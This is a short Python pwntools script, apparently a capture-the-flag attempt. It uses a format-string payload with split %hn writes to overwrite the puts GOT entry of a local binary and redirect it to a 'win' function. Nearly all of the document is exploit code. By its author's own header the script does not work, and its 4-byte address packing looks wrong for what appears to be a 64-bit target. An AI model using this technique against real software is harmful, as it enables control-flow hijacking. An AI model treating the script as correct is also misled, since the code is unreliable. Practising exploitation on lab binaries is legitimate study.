### THIS SCRIPT DOES NOT WORK AND I DONT KNOW WHY

from pwn import *

elf = context.binary = ELF('./notspecified', checksec=False)
context.log_level = 'debug'


io = process()

# objdump -R notspecified | grep <something>

# win address = 0x004011f6 

# low_addr_value = 11f6 (4598 in decimal)
# high_addr_value = 0040 (64 in decimal)



# puts address = 0x00404020

# low_addr = \x20\x40\x40\x00
# high_addr = \x22\x40\x40\x00


# high_value_new = 64 - 8 = 56
# low_value_new = 4598 - 64 = 4534

payload = b'\x22\x40\x40\x00\x20\x40\x40\x00%56x%6$hn%4534x%7$hn'


write('payload', payload)

io.sendlineafter(b'Please provide your username\n', payload)
io.interactive()



